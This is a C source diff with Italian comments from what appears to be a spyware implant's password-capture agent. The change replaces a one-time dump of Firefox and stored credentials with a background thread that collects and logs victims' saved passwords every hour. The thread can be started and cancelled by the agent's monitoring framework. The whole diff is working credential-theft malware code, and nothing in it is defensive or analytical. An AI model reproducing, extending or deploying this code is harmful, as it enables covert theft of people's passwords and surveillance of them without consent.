@@ -15,6 +15,13 @@ extern void FireFoxUnInitFunc(void);
 
 //globals
 HANDLE hfpwd;
+#define PASSWORD_SLEEP_TIME (1000*60*60) //millisecondi  (ogni ora)
+
+// Globals
+BOOL g_bPasswordForceExit = FALSE;	// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)
+BOOL bPM_PasswordStarted = FALSE;	// Indica se l'agente e' attivo o meno
+HANDLE hPasswordThread = NULL;		// Thread di cattura
+DWORD g_password_delay = 0;			// Il delay deve essere assoluto (non deve ricominciare ad ogni sync)
 
 
 int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass)
@@ -97,14 +104,43 @@ void DumpPasswords()
 	Log_CloseFile(hfpwd);
 }
 
+DWORD WINAPI CapturePasswordThread(DWORD dummy)
+{
+	LOOP {
+		// Se e' appena partito prende subito i contatti
+		if (g_password_delay == 0) {
+			FireFoxInitFunc();
+			DumpPasswords();
+		}
+
+		// Sleepa 
+		while (g_password_delay < PASSWORD_SLEEP_TIME) {
+			Sleep(200);
+			g_password_delay += 200;
+			CANCELLATION_POINT(g_bPasswordForceExit);
+		}
+		g_password_delay = 0;
+	}
+}
+
 
 DWORD __stdcall PM_PStoreAgentStartStop(BOOL bStartFlag, BOOL bReset)
 {
-	// Questo agente non ha stato started/stopped, ma quando
-	// viene avviato esegue un'azione istantanea.
+	DWORD dummy;
+	if (bPM_PasswordStarted == bStartFlag)
+		return 0;
+
+	bPM_PasswordStarted = bStartFlag;
+
 	if (bStartFlag) {
-		FireFoxInitFunc();
-		DumpPasswords();
+		// Se e' stato startato esplicitamente, ricomincia catturando
+		if (bReset)
+			g_password_delay = 0;
+
+		// Crea il thread che cattura le password
+		hPasswordThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CapturePasswordThread, NULL, 0, &dummy);
+	} else {
+		QUERY_CANCELLATION(hPasswordThread, g_bPasswordForceExit);
 	}
 
 	return 1;
@@ -126,5 +162,4 @@ DWORD __stdcall PM_PStoreAgentUnregister()
 void PM_PStoreAgentRegister()
 {
 	AM_MonitorRegister(PM_PSTOREAGENT, NULL, (BYTE *)PM_PStoreAgentStartStop, (BYTE *)PM_PStoreAgentInit, (BYTE *)PM_PStoreAgentUnregister);
-	//PM_PStoreAgentInit(NULL, FALSE); Non serve :)
 }
